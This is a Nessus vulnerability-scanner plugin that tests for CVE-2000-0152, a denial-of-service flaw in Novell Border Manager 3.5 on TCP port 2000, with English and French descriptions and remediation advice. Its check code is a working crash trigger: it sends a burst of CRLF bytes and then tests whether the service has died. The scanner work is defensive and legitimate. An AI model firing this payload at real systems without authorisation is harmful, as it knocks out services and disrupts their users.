#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10163);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2000-0152");
 name["english"] = "Novell Border Manager";
 name["francais"] = "Novell Border Manager";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The port 2000 is open, and Novell Border Manager
*might* be listening on it.

There is a denial of service attack that allow
an intruder to make a Novell Border Manager 3.5 slowly
die.

If you see an error message on this computer telling 
you 'Short Term Memory Allocator is out of Memory'
then you are vulnerable to this attack.

An attacker may use this flaw to prevent this
service from doing its job and to prevent the 
user of this station to work on it.

Solution : contact Novell and ask for a patch or
filter incoming TCP connections to port 2000

Risk factor : High
Warning : if there is no error message whatsoever on this
computer, then this is a false positive";


 desc["francais"] = "
Le port 2000 est ouvert, et il *se peut* que
Novell Border Manager 3.5 soit en écoute derrière.

Il existe une attaque par déni de service qui permet 
à un intrus de tuer lentement celui-ci.

Si vous voyez un message d'erreur sur ce système, parlant
de mémoire n'ayant pu etre allouée, alors il est vulnérable
à cette attaque.

Un pirate peut utiliser ce problème pour non seulement
empecher ce service de fonctionner correctement, mais aussi
pour empecher l'utilisateur de ce système de ce servir de
celui-ci.


Solution : contactez Novell et demandez un patch ou filtrez
les connections entrantes vers le port tcp 2000
Facteur de risque : Sérieux
Attention : s'il n'y a pas de message d'erreur sur la machine en
question, alors ce warning est une fausse alerte";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote Border Manager";
 summary["francais"] = "Plante BorderManager";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 script_require_ports(2000);
 exit(0);
}

#
# The script code starts here
#


if(get_port_state(2000))
{
 soc = open_sock_tcp(2000);
 if(soc)
 {
  msg = crap(data:"\r\n", length:20);
  send(socket:soc, data:msg);
  close(soc);
  soc = open_sock_tcp(2000);
  if ( ! soc ) security_hole(2000); 
  else close(soc);
 }
} 
